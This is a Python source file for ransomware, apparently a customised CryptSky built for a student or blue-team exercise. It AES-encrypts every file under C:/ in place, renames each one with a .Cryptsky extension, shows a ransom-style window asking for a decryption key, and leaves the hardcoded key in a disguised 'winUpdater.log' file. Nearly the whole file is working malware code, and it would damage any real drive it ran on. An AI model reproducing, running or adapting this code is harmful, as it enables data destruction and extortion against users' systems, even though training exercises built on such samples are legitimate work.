#!/usr/bin/env python
import shlex
from pathlib import Path

from Cryptodome.Cipher import AES
from Cryptodome.Util import Counter
import argparse
import os
import discover
import modify
import tkinter
import threading
import time

# -----------------
# GLOBAL VARIABLES
# -----------------
# hardcoded key to make easier for students to decrypt
HARDCODED_KEY = 'yellow submarine'
# Can change to C:/ later to encrypt drive, but this is for testing
START_DIR = ['C:/']
# Path of evidence file dropped to disk
PATH = Path(r'C:/Windows/Temp/winUpdater.log')


class WindowThread(threading.Thread):
    def run(self):

        print("In Window Thread")
        global root
        root = tkinter.Tk()
        frame = tkinter.Frame(root)
        frame.grid()
        frame.pack()
        oops = tkinter.Label(frame, text="Oops... Looks like JBOOZ encrypted your files ¯\_(ツ)_/¯", font=('Helvetica', 20))
        oops.pack()
        # warning that if program closes early, one file will be in a partially encrypted limbo state
        warning = tkinter.Label(root,
                              text="Do not close this program or turn off the VM "
                                   "until this window says it is safe to do so... "
                                   "\nor face (some) permanent damage.\n You have been warned\n"
                                   "When encryption is complete, look for the key. "
                                   "It's hidden somewhere on this system"
                                , font=('Helvetica', 20))
        warning.pack()
        label = tkinter.Label(frame, text="Enter the decryption key below", font=('Helvetica', 20))
        label.pack()
        e = tkinter.Entry(frame, width=20, font=('Helvetica', 20))
        e.pack()

        def callback():
            bool = decrypt(e.get())
            if bool:
                exit()
            else:
                dline = tkinter.Label(frame, text="Incorrect Key", font=('Helvetica', 20))
                dline.pack()

        button = tkinter.Button(frame, text="Decrypt", font=('Helvetica', 20), width=10, command=callback)
        button.pack()
        root.mainloop()
        pass


def decrypt(key):
    if check_key(key):
        l= tkinter.Label(root, text="This is the correct key. \n"
                                         "Your files are being decrypted but it may take a while. Please wait...")
        l.pack()
        ctr = Counter.new(128)
        crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
        startdirs = START_DIR
        for currentDir in startdirs:
            for file in discover.discoverFiles(currentDir):
                (name, ext) = os.path.splitext(file)
                if ext in '.Cryptsky':
                    try:
                        modify.modify_file_inplace(file, crypt.encrypt)
                        os.rename(file, name)
                    except IOError:
                        print("Error")
        try:
            print()
            os.remove(r'C:\Windows\Temp\winUpdater.log')
        except FileNotFoundError:
            pass
        label = tkinter.Label(root, text="Congratulations. Your files are now decrypted")
        label.pack()
    else:
        return False


def check_key(key):
    if key == HARDCODED_KEY:
        print("Key Match")
        return True
    else:
        print("Key no match")
        return False


def main():

    if PATH.is_file():
        print("Already Encrypted :)")
        window_thread = WindowThread()
        window_thread.start()
        time.sleep(10)
        safe = tkinter.Label(root, text="It is now safe to stop execution of this program. "
                                        "Hopefully you found the key ;)")
        safe.pack()
    else:

        key = HARDCODED_KEY
        ctr = Counter.new(128)
        crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)

        # change this to fit needs.
        startdirs = START_DIR

        # starts window so it appears while files are still being encrypted
        window_thread = WindowThread()
        window_thread.start()

        # encrypt files
        for currentDir in startdirs:
            for file in discover.discoverFiles(currentDir):
                try:
                    modify.modify_file_inplace(file, crypt.encrypt)
                    os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
                except IOError:
                    print("Error")

        # write evidence file to disk
        file = open(PATH, 'w+')
        file.write("JBOOZ encrypted this with a custom version of CryptSky. "
                   "The key for this version is: yellow submarine") # you're welcome blue team ;)
        file.close()
        safe = tkinter.Label(root, text="It is now safe to stop execution of this program. "
                                        "Hopefully you found the key ;)")
        safe.pack()
        ''' # Taken out for Case Studies
        # This wipes the key out of memory
        # to avoid recovery by third party tools
        for _ in range(100):
            key = random(32)
            pass
        '''


if __name__=="__main__":
    main()
